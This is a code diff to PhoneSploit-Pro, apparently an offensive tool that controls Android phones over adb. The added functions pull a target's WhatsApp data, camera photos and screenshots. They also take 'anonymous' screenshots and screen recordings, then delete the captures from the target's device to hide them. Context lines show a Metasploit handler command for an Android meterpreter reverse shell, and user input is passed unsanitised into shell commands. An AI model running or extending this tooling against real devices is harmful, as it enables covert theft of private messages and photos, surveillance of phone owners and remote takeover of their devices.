@@ -193,7 +193,7 @@ def pull_file():
         print(f"\nSaving file to PhoneSploit-Pro/{destination}\n")
     else:
         print(f"\nSaving file to {destination}\n")
-    os.system("adb pull /sdcard/" + location + " " + destination)
+    os.system(f'adb pull /sdcard/{location} {destination}')
 
     # Asking to open file
     choice = input('\nDo you want to Open the file? [Y / N] > ').lower()
@@ -250,8 +250,8 @@ def launch_app():
 def list_apps():
     print('''
 
-    1 - List third party packages
-    2 - List all packages
+    1. List third party packages
+    2. List all packages
     ''')
     mode = int(input("> "))
     if mode == 1:
@@ -261,12 +261,25 @@ def list_apps():
     print("\n")
 
 
-def reboot(arg):
-    if arg == 'system':
+def reboot(key):
+    if key == 'system':
         os.system('adb reboot')
     else:
-        os.system(f'adb reboot {arg}')
-    print('\n')
+        print('''
+
+        1. Reboot to Recovery Mode
+        2. Reboot to Bootloader
+        3. Reboot to Fastboot Mode
+        ''')
+        mode = int(input("> "))
+        if mode == 1:
+            os.system('adb reboot recovery')
+        elif mode == 2:
+            os.system('adb reboot bootloader')
+        elif mode == 3:
+            os.system('adb reboot fastboot')
+
+    print("\n")
 
 
 def list_files():
@@ -278,7 +291,7 @@ def list_files():
 def change_page(name):
     global page
     if name == 'p':
-        page = banner.menu
+        page = banner.menu1
     elif name == 'n':
         page = banner.menu2
     clear_screen()
@@ -339,6 +352,121 @@ def hack():
         f"msfconsole -x 'use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; set LHOST {ip} ; set LPORT 4444 ; exploit ; help'")
 
 
+def copy_whatsapp():
+    print("\nEnter location to save WhatsApp Data, Press 'Enter' for default")
+    destination = input("> ")
+    if destination == "":
+        destination = 'Downloaded-Files'
+        print(f"\nSaving data to PhoneSploit-Pro/{destination}\n")
+    else:
+        print(f"\nSaving data to {destination}\n")
+
+    location = '/sdcard/Android/media/com.whatsapp/WhatsApp'
+    # 'test -d' checks if directory exist or not
+    folder_status = os.system(f'adb shell test -d {location}')
+
+    # If WhatsApp exists in Android
+    if folder_status == 0:
+        location = '/sdcard/Android/media/com.whatsapp/WhatsApp'
+    else:
+        location = '/sdcard/WhatsApp'
+
+    os.system(f"adb pull {location} {destination}")
+    print('\n')
+
+
+def copy_screenshots():
+    print("\nEnter location to save Screenshots, Press 'Enter' for default")
+    destination = input("> ")
+    if destination == "":
+        destination = 'Downloaded-Files'
+        print(f"\nSaving Screenshots to PhoneSploit-Pro/{destination}\n")
+    else:
+        print(f"\nSaving Screenshots to {destination}\n")
+
+    location = '/sdcard/Pictures/Screenshots'
+    os.system(f"adb pull {location} {destination}")
+    print('\n')
+
+
+def copy_camera():
+    print("\nEnter location to save Photos, Press 'Enter' for default")
+    destination = input("> ")
+    if destination == "":
+        destination = 'Downloaded-Files'
+        print(f"\nSaving Photos to PhoneSploit-Pro/{destination}\n")
+    else:
+        print(f"\nSaving Photos to {destination}\n")
+
+    location = '/sdcard/DCIM/Camera'
+    os.system(f"adb pull {location} {destination}")
+    print('\n')
+
+
+def anonymous_screenshot():
+    os.system("adb shell screencap -p /sdcard/screen.png")
+    print("\nEnter location to save screenshot, Press 'Enter' for default")
+    destination = input("> ")
+    if destination == "":
+        destination = 'Downloaded-Files'
+        print(
+            f"\nSaving screenshot to PhoneSploit-Pro/{destination}\n")
+    else:
+        print(
+            f"\nSaving screenshot to {destination}\n")
+
+    os.system(f"adb pull /sdcard/screen.png {destination}")
+
+    print('\nDeleting screenshot from Target\'s device\n')
+    os.system(f"adb shell rm -v /sdcard/screen.png")
+    # Asking to open file
+    choice = input('\nDo you want to Open the file? [Y / N] > ').lower()
+    if choice == 'y':
+        os.system(f"{opener} {destination}/screen.png")
+
+    elif not choice == 'n':
+        while choice != 'y' and choice != 'n':
+            choice = input(
+                '\nInvalid choice!, Press Y or N > ').lower()
+            if choice == 'y':
+                os.system(f"{opener} {destination}/screen.png")
+
+    print("\n")
+
+
+def anonymous_screenrecord():
+    time = input("\nEnter the recording duration (in seconds) > ")
+    print('\nStarting Screen Recording...\n')
+    os.system(
+        f"adb shell screenrecord --verbose --time-limit {time} /sdcard/demo.mp4")
+    print("\nEnter location to save video, Press 'Enter' for default")
+    destination = input("> ")
+    if destination == "":
+        destination = 'Downloaded-Files'
+        print(
+            f"\nSaving video to PhoneSploit-Pro/{destination}\n")
+    else:
+        print(
+            f"\nSaving video to {destination}\n")
+
+    os.system(f"adb pull /sdcard/demo.mp4 {destination}")
+
+    print('\nDeleting recording from Target\'s device\n')
+    os.system(f"adb shell rm -v /sdcard/demo.mp4")
+    # Asking to open file
+    choice = input('\nDo you want to Open the file? [Y / N] > ').lower()
+    if choice == 'y':
+        os.system(f"{opener} {destination}/demo.mp4")
+
+    elif not choice == 'n':
+        while choice != 'y' and choice != 'n':
+            choice = input(
+                '\nInvalid choice!, Press Y or N > ').lower()
+            if choice == 'y':
+                os.system(f"{opener} {destination}/demo.mp4")
+    print("\n")
+
+
 def main():
 
     # Clearing the screen and presenting the menu
@@ -388,11 +516,17 @@ def main():
         case '16':
             list_files()
         case '17':
-            reboot('recovery')
+            reboot('advanced')
         case '18':
-            reboot('bootloader')
+            copy_whatsapp()
         case '19':
-            reboot('fastboot')
+            copy_screenshots()
+        case '20':
+            copy_camera()
+        case '21':
+            anonymous_screenshot()
+        case '22':
+            anonymous_screenrecord()
         case other:
             print("\nInvalid selection!\n")
 
@@ -404,7 +538,7 @@ run_phonesploit_pro = True
 operating_system = ''
 clear = 'clear'
 opener = 'xdg-open'
-page = banner.menu
+page = banner.menu1
 
 start()
 
